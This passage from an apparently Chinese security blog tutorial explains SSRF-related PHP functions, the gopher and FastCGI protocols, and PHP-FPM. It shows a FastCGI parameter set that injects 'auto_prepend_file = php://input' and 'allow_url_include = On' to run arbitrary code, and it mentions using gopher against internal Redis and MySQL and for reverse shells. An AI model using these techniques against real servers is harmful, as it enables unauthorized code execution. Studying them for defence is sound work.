class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>;  <span class="comment">//errno应该是错误号，404这种</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以和Python中的socket模块里的，socket.socket函数类比一下。用于建立传输链接。</p><h3 id="3、curl-exec"><a href="#3、curl-exec" class="headerlink" title="3、curl_exec()"></a>3、curl_exec()</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220623141239861.png" alt="image-20220623141239861"></p></blockquote><p>函数用于执行指定的curl会话。</p><blockquote><p>**什么是cURL?**（<a href="https://baike.baidu.com/item/curl/10098606?fr=aladdin%EF%BC%89">https://baike.baidu.com/item/curl/10098606?fr=aladdin）</a></p><p><strong>cURL是一个利用URL语法在命令行下工作的文件传输工具</strong>，1997年首次发行。</p><p>cURL支持的通信协议有：</p><p><a href="https://baike.baidu.com/item/FTP">FTP</a>、<a href="https://baike.baidu.com/item/FTPS">FTPS</a>、<a href="https://baike.baidu.com/item/HTTP">HTTP</a>、<a href="https://baike.baidu.com/item/HTTPS">HTTPS</a>、<a href="https://baike.baidu.com/item/TFTP">TFTP</a>、<a href="https://baike.baidu.com/item/SFTP">SFTP</a>、<a href="https://baike.baidu.com/item/Gopher">Gopher</a>、<a href="https://baike.baidu.com/item/SCP">SCP</a>、<a href="https://baike.baidu.com/item/Telnet">Telnet</a>、DICT、FILE、<a href="https://baike.baidu.com/item/LDAP">LDAP</a>、LDAPS、<a href="https://baike.baidu.com/item/IMAP">IMAP</a>、<a href="https://baike.baidu.com/item/POP3">POP3</a>、<a href="https://baike.baidu.com/item/SMTP">SMTP</a>和<a href="https://baike.baidu.com/item/RTSP">RTSP</a>。</p><p>此外，cURL还支持SSL认证，HTTP POST、HTTP PUT、FTP上传, HTTP form based upload、proxies、HTTP&#x2F;2、cookies、用户名+密码认证（包含了多种加密方式。）</p><p>常见的使用方法：</p><p><strong>获得页面</strong></p><p>使用命令：curl <a href="http://curl.haxx.se/">http://curl.haxx.se</a></p><p>这是最简单的使用方法。用这个命令获得了<a href="http://curl.haxx.se指向的页面,同样,如果这里的url指向的是一个文件或者一幅图都可以直接下载到本地.如果下载的是html文档,那么缺省的将只显示文件头部,即html文档的header.要全部显示,请加参数/">http://curl.haxx.se指向的页面，同样，如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。如果下载的是HTML文档，那么缺省的将只显示文件头部，即HTML文档的header。要全部显示，请加参数</a> -i，要只显示头部，用参数 -I。任何时候，可以使用 -v 命令看curl是怎样工作的，它向服务器发送的所有命令都会显示出来。为了<a href="https://baike.baidu.com/item/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0">断点续传</a>，可以使用-r参数来指定传输范围。 </p><p><strong>获取表单</strong></p><p>可以使用各种不同的参数来进行表单的传值，可以使用POST，也可以使用GET，同时也可以使用PUT或者是别的方式进行提交。</p><p><strong>有关认证</strong></p><p>可以处理各种情况的认证界面，例如提交用户名和密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -U proxyuser:proxypassword http://curl.haxx. se</span><br></pre></td></tr></table></figure><p><strong>引用</strong></p><p>有的网络资源访问的时候必须经过另外一个网络地址跳转过去，也就是使用了referer（可以参考一下http请求中的）</p><p><strong>指定客户端</strong></p><p>有的网络资源首先需要判断用户使用的是什么浏览器，符合了标准才能够下载或者浏览，可以使用curl伪装成为需要的浏览器。</p><p><strong>Cookie</strong></p><p>Cookie是服务器经常使用的一种记忆客户信息的方法，如果cookie被记录在了文件中，则可以根据旧的cookie写出性的，发送到网站。</p><p><strong>加密HTTP</strong></p><p>可以直接通过cURL访问网站。</p><p><strong>http认证</strong></p><p>如果是采用证书认证的http地址，证书在本地，则可以使用本地的证书认证来进行访问。</p><p>PHP中相关函数在4.0.2版本后被引入，相关函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624145606239.png" alt="image-20220624145606239"></p></blockquote><p><strong>注意：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">2.file_get_contents的gopher协议不能URL编码</span><br><span class="line">3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">5.curl_exec() //默认不跟踪跳转，</span><br><span class="line">6.file_get_contents() // file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure><h3 id="4、fopen"><a href="#4、fopen" class="headerlink" title="4、fopen()"></a>4、fopen()</h3><p>用于打开一个文件或者是一个url。</p><h3 id="5、readfile"><a href="#5、readfile" class="headerlink" title="5、readfile()"></a>5、readfile()</h3><p>输出一个文件的内容。</p><h3 id="相关协议："><a href="#相关协议：" class="headerlink" title="相关协议："></a>相关协议：</h3><p>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p><p>（5）<code>FastCGI</code>：FastCGI协议</p><p>（6）<code>Redis</code>：REPS协议</p><p><strong>协议说明：</strong></p><h4 id="Gopher协议："><a href="#Gopher协议：" class="headerlink" title="Gopher协议："></a>Gopher协议：</h4><blockquote><p>Gopher协议是Internet上一个非常有名的信息查找系统，他将Internet上的文件组织成某种索引，很方便的将用户从Internet的一处带到另一处。在WWW出现之前，GOpher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是在WWW出现之后，Gopher失去了昔日的辉煌。现在它基本果实，人们很少使用它。</p></blockquote><p>Gopher协议支持发送GET，POST请求，可以先结果GET请求包，和POST请求包，再构成复合Gopher协议的请求。</p><p>**gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样gopher协议才能正确解析。<br>支持gopher协议的有  和  **</p><p><strong>Gopher协议格式</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></figure><p><strong>默认使用端口：</strong>70</p><p>如果发起POST请求，需要使用<code>%0d%0a</code>作为换行符，如果多个参数，需要将链接符号<code>&amp;</code>也进行URL编码。</p><p>可以用于攻击内网的Redis，Mysql，FastCGI，FTP等，也可以发送GET，POST请求，拓宽了SSRF的攻击面。</p><p>（例如可以使用file协议，进行本地文件读取）</p><h4 id="FastCGI协议："><a href="#FastCGI协议：" class="headerlink" title="FastCGI协议："></a>FastCGI协议：</h4><blockquote><p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序(CGI程序)之间数据胡同，于是出现了CGI(Common Gateway Interface)通用网关接口。<strong>简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</strong></p><p>当遇到动态脚本请求的时候，Web服务器的主进程就会Fork创建出一个新的进程来启动CGI程序，运行C、PHP等脚本程序的时候，也就是将动态脚本交给CGI程序进行处理。</p><p><strong>启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。</strong>这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。</p></blockquote><blockquote><p>使用CGI可以解决Web服务器与PHP解释器的通信问题，但是Web服务器有一个问题，来回启动CGI程序然后再杀掉，是非常浪费资源的，于是出现了优化版本，FastCGI(Fast Common Gateway Interface)快速通用网关接口。</p><p><strong>Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，从而使服务器可以同时处理更多的网页请求。这样就会大大的提高效率。</strong></p></blockquote><p><strong>动态网页访问：</strong></p><p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会去找PHP解析器来进行处理（这里以Apache为例），它会把这个请求进行简单的处理，然后交给PHP解释器。</p><p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI  程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以CGI规定的格式返回处理后的结果，退出进程，Web Server 再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p><p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，<strong>其主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p><p><strong>协议分析：</strong></p><p>FastCGI其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是 <strong>浏览器和服务器中间件</strong> 进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比 HTTP 协议来说，<code>FastCGI</code>协议则是 <strong>服务器中间件和某个语言后端</strong>  进行数据交换的协议，同时直接使用二进制传递数据。Fastcgi 协议由多个 <code>Record</code> 组成，Record 也有 Header 和 Body  一说，服务器中间件将这二者按照 Fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照  Fastcgi 协议封装好后返回给<strong>服务器中间件</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624193417656.png" alt="image-20220624193417656"></p><h5 id="FastCGI-Record的格式："><a href="#FastCGI-Record的格式：" class="headerlink" title="FastCGI Record的格式："></a><strong>FastCGI Record的格式：</strong></h5><p><strong>头部，身体：</strong></p><p>Record的头固定8个字节，body的大小由头部中contentLenght指定（两字节），结构如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  unsigned char version; <span class="comment">// 版本</span></span><br><span class="line">  unsigned char type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  unsigned char requestIdB1; <span class="comment">// 本次record对应的请求id(一个变量是一个字节，这里是两个变量，所以一共两个字节)</span></span><br><span class="line">  unsigned char requestIdB0; <span class="comment">//变量2</span></span><br><span class="line">  unsigned char contentLengthB1; <span class="comment">// body体的大小（同上，两个变量，一共两个字节）</span></span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  unsigned char reserved;     <span class="comment">//保留字段</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  unsigned char contentData[contentLength];     <span class="comment">//body内容数据</span></span><br><span class="line">  unsigned char paddingData[paddingLength];     <span class="comment">//填充数据</span></span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个 uchar 类型的变量组成，每个变量一个字节。其中，<code>requestId</code> 占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code> 占两个字节，表示 Body 的大小。可见，一个 Fastcgi Record 结构最大支持的 Body 大小是<code>2^16</code>，也就是 65536 字节（两个字节十六位，一位表示1，0两种情况）。</p><p><strong>字段选项：</strong></p><p>刚才我们介绍了 Fastcgi 协议中Record部分中各个结构的含义，其中第二个字节为 <code>type</code>，我们将对其进行详细讲解。</p><p><code>type</code> 就是指定该 Record 的作用。因为 Fastcgi 中一个 Record 的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个 Record，通过 <code>type</code> 来标志每个 Record 的作用，并用 <code>requestId</code> 来标识同一次请求的id。也就是说，每次请求，会有多个 Record，他们的 <code>requestId</code> 是相同的。</p><p>type字段选项：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">FCGI_Type</span> </span>&#123;</span><br><span class="line">  FCGI_BEGIN_REQUEST     = <span class="number">1</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示一次请求的开始</span></span><br><span class="line">  FCGI_ABORT_REQUEST     = <span class="number">2</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示终止一次请求</span></span><br><span class="line">  FCGI_END_REQUEST       = <span class="number">3</span>,  <span class="comment">// (FastCGI-&gt;WEB) 请求已被处理完毕</span></span><br><span class="line">  FCGI_PARAMS            = <span class="number">4</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示一个向CGI程序传递的环境变量</span></span><br><span class="line">  FCGI_STDIN             = <span class="number">5</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示向CGI程序传递的标准输入</span></span><br><span class="line">  FCGI_STDOUT            = <span class="number">6</span>,  <span class="comment">// (FastCGI-&gt;WEB) 表示CGI程序的标准输出   </span></span><br><span class="line">  FCGI_STDERR            = <span class="number">7</span>,  <span class="comment">// (FastCGI-&gt;WEB) 表示CGI程序的标准错误输出</span></span><br><span class="line">  FCGI_DATA              = <span class="number">8</span>,  <span class="comment">// (WEB-&gt;FastCGI) 向CGI程序传递的额外数据</span></span><br><span class="line">  FCGI_GET_VALUES        = <span class="number">9</span>,  <span class="comment">// (WEB-&gt;FastCGI) 向FastCGI程序询问一些环境变量</span></span><br><span class="line">  FCGI_GET_VALUES_RESULT = <span class="number">10</span>, <span class="comment">// (FastCGI-&gt;WEB) 询问环境变量的结果</span></span><br><span class="line">  FCGI_UNKNOWN_TYPE      = <span class="number">11</span>  <span class="comment">// 未知类型，可能用作拓展</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624194357920.png" alt="image-20220624194357920"></p><p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code> 为1的 Record，后续互相交流，发送 <code>type</code> 为4、5、6、7的 Record，结束时发送 <code>type</code> 为2、3的 Record。</p><p>当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><p>1、key、value均小于128字节，用FCGI_NameValuePair11</p><p>2、key大于128字节，value小于128字节，用FCGI_NameValuePair41</p><p>3、key小于128字节，value大于128字节，用FCGI_NameValuePair14</p><p>4、key、value均大于128字节，用FCGI_NameValuePair44</p><h5 id="PHP-FPM："><a href="#PHP-FPM：" class="headerlink" title="PHP-FPM："></a>PHP-FPM：</h5><p>官方对PHP-FPM的解释是 FastCGI 进程管理器，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。PHP-FPM 默认监听的端口是 9000 端口。</p><p>也就是说 <strong>PHP-FPM 是 FastCGI 的一个具体实现</strong>，并且提供了进程管理的功能，在其中的进程中，包含了 master 和 worker 进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中<strong>master 进程负责与 Web 服务器中间件进行通信</strong>，接收服务器中间按照 FastCGI 的规则打包好的用户请求，再将请求转发给 worker 进程进行处理。<strong>worker 进程主要负责后端动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p><blockquote><p>简单来说，这个就是一个基于PHP语言实现的FastCGI进程管理器，因为FastCGI只是一个协议规范，需要每个语言具体去实现，PHP-FPM就是PHP版本的FastCGI协议的具体实现。使用这个，就是实现PHP脚本与Web服务器之间的同行，同时也是一个PHP SAPI，从而构建起了PHP解释器与Web服务器之间的桥梁。（或者可以理解为是PHP的环境，同时也是传输数据用的）</p></blockquote><p>例如当用户对<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>进行访问的时候，根据Web服务器的目录，Web服务器的中间件，将相关的请求进行变换，修改为key-value对（键值对）</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;&#125;</span><br></pre></td></tr></table></figure><p>总的来说，将具体请求更改为键值对，进行传输，可以看见，其中包含了网关，请求方式，Web服务器根目录，还有服务器名字等具体信息。</p><p>这个数组其实就是PHP中的预定义数组，__SERVER的一部分，也就是相当于是PHP中的环境变量，既可以对__SERVER数组进行填充，同时也可以对FPM（环境）告知需要执行的PHP文件。</p><p>当PHP-FPM拿到FastCGI的数据包的时候，进行解析，得到上述的环境变量，然后执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702113123515.png" alt="image-20220702113123515"></p><p>（在这个部分）</p><p>如果可以进行更改，那就可以实现未授权访问。</p><h6 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行:"></a>PHP-FPM任意代码执行:</h6><p>Web服务器中间件，会将用户请求设置为环境变量，并且会通过字段<code>SCRIPT_FILENAME</code>来对中间件执行的PHP文件进行设置。</p><p>理论上是只能对已经存在的文件进行执行，而不能进行任意代码执行。</p><p>但是因为在PHP 5.3.9以上的版本中，PHP多了一个选项<code>security.limit_extensions</code>安全选项。</p><p>导致PHP-FPM可以进行控制执行的文件只有php,php3,php4,php5,php7这样的文件。</p><p><strong>但是可以利用PHP中存在的配置：</strong></p><p><code>auto_prepend_file</code>:在执行目标文件之前先对auto_prepend_file中指定的文件进行包含。</p><p><code>auto_append_file</code>:在执行了目标文件之后，对auto_append_file指定的文件进行包含。</p><blockquote><p>也就是说，将<code>auto_prepend_file</code>选项设为<code>php://input</code>(将POST中的内容作为PHP代码执行)，那么在执行任何PHP文件之前都要对POST的内容进行一次文件执行。</p><p>也就是，将HTTP请求的body部分进行改写，就能够执行了。</p></blockquote><p>不过使用php:&#x2F;&#x2F;input使用也需要启用相关的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702120556587.png" alt="image-20220702120556587"></p><p><strong>如何设置环境变量的值：</strong></p><p>对于auto_prepend_file这类的环境变量，我们要想设置成php:&#x2F;&#x2F;input，就需要远程设置。</p><p>在PHP-FPM中有两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>，这两个环境变量可以用来设置PHP配置项。</p><p>其中：</p><blockquote><p><code>PHP_VALUE</code>:用来设置模式为：<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项。</p></blockquote><blockquote><p><code>PHP_ADMIN_VALUE</code>:可以用来设置所有选项</p></blockquote><p>通过这个方式对环境变量进行传入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27; &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;</span><br></pre></td></tr></table></figure><p>通过对传入的环境变量进行修改，可以将PHP-FPM中的环境变量进行设置。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702173235441.png" alt="image-20220702173235441"></p><p>常见的方式就是直接使用<code>PHP_ADMIN_VALUE</code>进行设置，然后就能通过php:&#x2F;&#x2F;input伪协议来进行任意代码执行。同时也可以根据需要，开启相应的<strong>远程文件包含设置</strong>。</p><h6 id="PHP-FPM未授权访问漏洞："><a href="#PHP-FPM未授权访问漏洞：" class="headerlink" title="PHP-FPM未授权访问漏洞："></a>PHP-FPM未授权访问漏洞：</h6><p>因为可以通过<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>这两个环境变量对PHP配置进行设置，所以攻击者可以通过<code>PHP-FPM</code>执行任意代码，实现代码执行漏洞。</p><p>初次之外，因为PHP-FPM和Web服务器中间件是通过网络进行沟通的，所以会有越来越多的集群将PHP-FPM直接绑定在公网上，所有人都可以对起进行访问，也就是说，任何人都可以伪装成Web服务器中间件来让PHP-FPM执行我们想要执行的恶意代码。这就会造成PHP-FPM的未授权访问漏洞。</p><p>（简单来说，就是可以通过伪装成Web服务器的方式，来对PHP-FPM发送数据，以执行需要的代码，或者是访问需要的网页，前提是PHP-FPM这个组件在公网，可以直接进行访问）</p><h6 id="SSRF中对于FPM-x2F-FastCGI的攻击："><a href="#SSRF中对于FPM-x2F-FastCGI的攻击：" class="headerlink" title="SSRF中对于FPM&#x2F;FastCGI的攻击："></a>SSRF中对于FPM&#x2F;FastCGI的攻击：</h6><p>可以看见的是，因为上述攻击中，要求我们可以从公网访问到PHP-FPM，如果不是公网，而是内网访问的话，就不能直接发包。<strong>要进行攻击的话，就需要从内网进行攻击，例如使用SSRF来进行反打。</strong></p><p>只要可以调用相关的函数，就可以通过url进行payload的传输，然后就能进行攻击。</p><h6 id="这篇总结相当好"><a href="#这篇总结相当好" class="headerlink" title="这篇总结相当好"></a>这篇总结相当好</h6><blockquote><p><a href="https://copyfuture.com/blogs-details/20210624174402663W">https://copyfuture.com/blogs-details/20210624174402663W</a></p></blockquote><h4 id="Redis协议（RESP协议）："><a href="#Redis协议（RESP协议）：" class="headerlink" title="Redis协议（RESP协议）："></a>Redis协议（RESP协议）：</h4><blockquote><p>应用系统和Redis之间通过Redis协议（RESP）进行交互。</p><p><strong>请求响应模式</strong></p><p>Redis协议使用TCP，也就是客户端和Redis之间保持双工的连接。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220704205113835.png" alt="image-20220704205113835"></p><p>也就是说，Redis协议就是专门用于客户端和Redis之间交互的协议。那么什么是Redis呢？</p><p><strong>Redis：</strong></p><p>REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是<strong>跨平台的非关系型数据库</strong>。</p><p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、<strong>可选持久性的键值对(Key-Value)存储数据库</strong>，并提供多种语言的 API。</p><p><strong>Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted 